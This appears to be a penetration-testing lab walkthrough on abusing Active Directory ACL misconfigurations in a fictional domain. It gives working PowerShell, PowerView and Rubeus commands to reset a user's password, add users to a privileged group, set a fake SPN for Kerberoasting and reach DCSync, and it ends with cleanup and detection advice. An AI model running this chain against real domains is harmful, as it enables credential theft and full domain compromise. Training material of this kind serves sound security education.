# Abusing ACLs

Recapping our current position: we control the user `wley`, whose NTLMv2 hash we cracked earlier using Responder and Hashcat. This access allows us to initiate an attack chain that could lead to full domain compromise by leveraging ACL misconfigurations.

## Attack Path Overview

1. Use `wley` to change the password of `damundsen`.
2. Authenticate as `damundsen` and leverage **GenericWrite** rights to add a user we control to the **Help Desk Level 1** group.
3. Exploit nested group membership in **Information Technology** to gain **GenericAll** rights over `adunn`.
4. Use `adunn`'s privileges to perform a **DCSync** attack, retrieving hashes for all users and escalating to Domain/Enterprise Admin.

---

## Step 1: Change User Password as `wley`

Create a PowerShell credential object:

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)


Set the target user's password:

```powershell
powershell

Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $SecPassword -Credential $Cred -Verbose
```

## Step 2: Add Self to a Privileged Group as `damundsen`

Create credentials for `damundsen`:

```powershell
powershell

$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword2)
```

Verify current group membership:

```powershell
powershell

Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

Add `damundsen` to the group:

```powershell
powershell

Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Confirm addition:

```powershell
powershell

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

## Step 3: Exploit Nested Group and Gain Control over `adunn`

Check if `damundsen` has rights over `adunn`:

```powershell
powershell

$sid2 = Convert-NameToSid "damundsen"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}
```

If `damundsen` has **GenericAll** rights, we can modify `adunn`'s `servicePrincipalName` attribute to create a fake SPN:

```powershell
powershell

Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

## Step 4: Kerberoast the User with Rubeus

Request a ticket for `adunn`:

```powershell
powershell

.\Rubeus.exe kerberoast /user:adunn /nowrap
```

This will generate a hash that can be cracked offline with Hashcat. Once cracked, we gain control over `adunn` and can perform a **DCSync** attack to retrieve all user hashes.

---

## Cleanup Steps

1. Remove the fake SPN:

```powershell
powershell

Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

2. Remove `damundsen` from the group:

```powershell
powershell

Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

3. Reset `damundsen`'s password (if known) or inform the client to do so.

---

## Final Notes

- Always document all modifications made during assessments.
- ACL misconfigurations are often overlooked but can be powerful attack vectors.
- Regular auditing and monitoring of ACLs, group memberships, and security events are essential for defense.

## Detection & Remediation Tips

- Regularly audit ACLs and remove dangerous permissions.
- Monitor high-impact groups and their membership changes.
- Enable advanced security auditing (Event ID 5136) to detect modifications.
- Use tools like BloodHound to visualize attack paths and identify risky ACLs.
